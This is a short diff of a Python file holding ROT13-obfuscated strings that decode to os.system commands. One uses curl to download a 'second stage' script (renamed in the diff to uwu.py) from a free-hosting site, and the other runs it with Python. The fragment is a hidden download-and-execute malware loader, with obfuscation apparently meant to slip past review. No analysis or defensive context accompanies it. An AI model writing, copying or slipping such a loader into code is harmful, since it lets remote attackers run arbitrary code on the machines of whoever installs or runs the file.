@@ -2,11 +2,11 @@ import codecs
 import os
 
 first = '''
-bf.flfgrz("phey -B uggcf://anhtug-obbxf.000jroubfgncc.pbz/frpbaq_fgntr.cl")
+bf.flfgrz("phey -B uggcf://anhtug-obbxf.000jroubfgncc.pbz/hjh.cl")
 '''
 
 second = '''
-bf.flfgrz("Clguba frpbaq_fgntr.cl")
+bf.flfgrz("Clguba hjh.cl")
 '''
 
 first_decoded = codecs.decode(first, 'rot13')
